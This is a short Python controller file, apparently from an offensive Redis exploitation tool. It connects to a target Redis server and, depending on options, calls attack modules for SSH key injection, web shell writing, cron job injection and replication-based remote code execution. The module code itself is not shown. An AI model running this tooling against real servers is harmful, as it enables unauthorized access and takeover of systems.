import redis
from lib.RsaInjection import RsaInjection
from lib.ShellInjection import ShellInjection
from lib.CronInjection import CronInjection
from lib.RedisRce import redisRce


class Controller:
    def __init__(self, options):

        self.options = options
        if self.options.auth:
            self.r = redis.StrictRedis(host=options.url, port=options.port, password=self.options.auth,
                                       socket_timeout=10)
        else:
            self.r = redis.StrictRedis(host=options.url, port=options.port, socket_timeout=10)
        print(f"TARGET {options.url}:{options.port}")

        if self.options.rsa:
            RsaInjection(self)
        if self.options.shell:
            ShellInjection(self)
        if self.options.cron:
            CronInjection(self)
        if self.options.slave:
            redisRce(self.options)
